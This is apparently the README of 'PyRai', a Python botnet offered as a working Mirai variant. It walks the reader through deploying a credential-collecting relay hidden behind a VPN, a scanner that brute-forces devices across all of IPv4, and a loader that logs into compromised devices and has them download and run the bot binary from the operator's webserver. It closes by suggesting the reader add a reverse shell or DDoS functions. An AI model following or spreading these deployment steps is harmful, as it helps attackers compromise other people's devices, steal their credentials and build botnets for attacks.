# Pyrai - Mirai python variant

This is a working variant of the Mirai IOT botnet, this is fully written in Python3 and you don't need external dependecies to make it working. In this paper I'm going to show you how to configure each script in order to setup your PyRai.

## Relay setup

First of all you need to setup up the relay, this server will collect all the username and password from the remote scanners each time they successfully bruteforce a device. So in order to do this open the file __relay.py__ and modify the variables:
- ```__PORT__ ```: The relay port ( feel free to use the default one )
- ```__MAXCONN__``` : This variable will accept a maximum of 1k connections ( by default ) at the same time to receive the credentials.

Now that the script is ready just run it:

``` python relay.py ```

and it should display something like the following:
```
[18:09:50] [INFO] Starting relay on port: 31337
[18:09:50] [WARNING] Configuration set to allow 1000 connections..
[18:09:50] [INFO] Relay is online!
```

_P.S._ I suggest you to setup a VPN for the relay in order to hide the real IP, just in case.

## Scanner deployment

Cool! Now that you have the relay running edit the file __scanner.py__ and modify the following vars:
```__RELAY_H__``` : The ip of the relay.
```__RELAY_P__``` : The port of the relay.

Of course they have to match the variables of the __relay.py__ script.

Now you can run the scanner :
```
python scanner.py
```

starting from your personal machine. Then it will start scanning the entire IPV4 and
if it can find some vulnerables machines it will report the credentials to the relay and it will write them down to :
__/dump/csdb.txt__ .

## Loader

Awsome! Now you got your own MIRAI running and trying to spread. Once your credentials will start to grow you can run the loader file to enlarge the botnet. 

Before run the loader be sure to have the __scanner.py__ file compiled for linux systems, you can find guides online (google is your friend). Otherwise you can run just the .py file but modify the line number __52__ of the loader file to run the .py file instead of the binary.

Before talking about the loader, let's analize how the infection process works.
- It will login into the compromised device using the username and password stored.
- If it can login it will move inside a common directory (var, usr, ...).
- It will download the binary and then it will delete the binary.

So the loader will run a webserver to serve the binary file.

Let's configure it !
``` __bin__ ``` : the direct link of the binary, be sure that is public accessible.
``` __webp_ ``` : the port of your webserver ( don't even remember if it was used or not ...).

Nice ! So now you can start spreading your botnet and when the loader will infect a new device it will print :
```
[loader] Broken.
```

And you'll have a new bot.

## Conclusion and stuff

The scanner file (the trojan) is not weaponized so when you infect a bot you don't have any backconnection or backdoor functions, but you can write them by yourself... because it easy to write a simple reverse shell or a simple ddos botnet. 
